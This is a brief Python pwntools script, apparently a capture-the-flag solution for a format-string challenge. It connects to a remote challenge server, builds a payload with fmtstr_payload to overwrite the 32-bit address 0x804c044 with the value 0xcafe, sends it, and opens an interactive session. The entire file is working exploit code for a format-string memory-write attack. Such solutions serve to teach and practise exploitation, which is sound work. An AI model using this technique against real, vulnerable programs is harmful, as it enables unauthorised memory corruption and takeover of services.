from pwn import *

# p = process("./format")
p = remote("chall.codefest.tech", 8743)

context.arch = "i386"

position = 0x804c044

print(p.recv())

writes = {
    position: 0xcafe
}

payload = fmtstr_payload(4, writes)
print(payload)

p.sendline(payload)

p.interactive()